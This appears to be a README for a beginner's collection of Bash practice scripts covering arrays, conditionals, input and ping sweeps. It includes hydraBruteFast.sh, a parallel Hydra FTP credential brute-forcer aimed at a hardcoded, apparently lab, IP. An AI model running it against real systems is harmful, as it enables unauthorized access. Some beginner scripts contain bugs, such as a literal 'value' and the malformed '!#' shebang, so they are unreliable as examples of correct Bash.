# Bash

Welcome to the Bash section. Here are the available scripts:


## arrays.sh

```bash
#!/bin/bash
#
transport=('car' 'train' 'bike' 'bus')

echo "${transport[@]}"

echo "${transport[1]}"

unset transport[1]

echo "${transport[@]}"

transport[1]='trainride'

echo "${transport[@]}"

cars=('honda' 'audi' 'bmw' 'tesla')

echo "${cars[@]}"

echo "${cars[2]}"


```

## conditionals.sh

```bash
count=10

if [ $count -eq 10 ]

then

	echo "true"

else

	echo "false"

fi


value="guessme"

guess=$1

if [ "value" = "$guess" ]

then
	echo "they are equal"

else

	echo "they are not equal"
	
fi

```

## conditionalsv2.sh

```bash
#!/bin/bash
#
#
filename=$1

if [ -f "$filename" ] && [ -w "filename" ]
then
	echo "Hello" >$filename
else
	touch "$filename"
	echo "Hello" > $filename
fi

```

## hydraBruteFast.sh

```bash
#!/bin/bash

# Target FTP server IP address
FTP_SERVER="10.129.158.92"

# Path to the username and password lists
USERNAME_LIST="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
PASSWORD_LIST="/usr/share/seclists/Passwords/cirt-default-passwords.txt"

# Check if the username and password files exist
if [ ! -f "$USERNAME_LIST" ]; then
    echo "Error: Username file '$USERNAME_LIST' not found."
    exit 1
fi

if [ ! -f "$PASSWORD_LIST" ]; then
    echo "Error: Password file '$PASSWORD_LIST' not found."
    exit 1
fi

# Determine the number of CPU cores
NUM_CORES=$(nproc)
NUM_WORKERS=$((NUM_CORES * 4))  # Example: Use 4 times the number of CPU cores

# Array to store background process IDs
declare -a PID_ARRAY=()

# Loop through each worker
for ((i=0; i<$NUM_WORKERS; i++))
do
    # Execute Hydra with the username and password lists
    hydra -F -q -L "$USERNAME_LIST" -P "$PASSWORD_LIST" ftp://$FTP_SERVER &
    
    # Store the process ID (PID) of each Hydra instance in the array
    PID_ARRAY+=($!)
done

# Wait for all workers to complete
for pid in "${PID_ARRAY[@]}"
do
    wait $pid
done

echo "Brute-force attack completed."

```

## parameters.sh

```bash
#!/bin/bash

echo Enter your name

read name

echo "Your name is $name"


```

## PingSweep.sh

```bash
#!/bin/bash

# Check if the correct number of arguments is provided
if [ $# -ne 1 ]; then
    echo "Usage: $0 <network_prefix>"
    exit 1
fi

# Loop over the IP addresses in the range 1 to 254
for ip in $(seq 1 254); do
    # Execute ping command in background
    ping -c 1 "$1.$ip" | grep -q "bytes from" && echo "$1.$ip" &
done

```

## pingsweepnoip.sh

```bash
#!/bin/bash

# Function to extract network prefix from IP address
get_network_prefix() {
    local ip="$1"
    echo "${ip%.*}"
}

# Get the IP address of the host
ip_address=$(hostname -I | awk '{print $1}')

# Check if an IP address is obtained
if [ -z "$ip_address" ]; then
    echo "Failed to retrieve IP address. Please check your network connection."
    exit 1
fi

# Extract the network prefix
network_prefix=$(get_network_prefix "$ip_address")

# Print the network prefix
echo "Network prefix: $network_prefix"

# Function to perform ping sweep for a given IP address
ping_sweep() {
    local ip="$1"
    ping -c 1 -w 1 "$ip" >/dev/null 2>&1 && echo "$ip"
}

# Loop over the IP addresses in the range 1 to 254
for ip in $(seq 1 254); do
    # Execute ping_sweep function in background
    ping_sweep "$network_prefix.$ip" &
done

```

## practice.sh

```bash
#!/bin/bash

echo "Hello World!"

ls -l ~/Desktop

whoami

id

name="jammy"

echo $name


```

## SoundAtInterval.sh

```bash
!#/bin/bash

#forloop
for i in {1..5}
do

	echo wakeup do pushups!

paplay /home/orca/Downloads/beep.mp3


	sleep 3

done


```
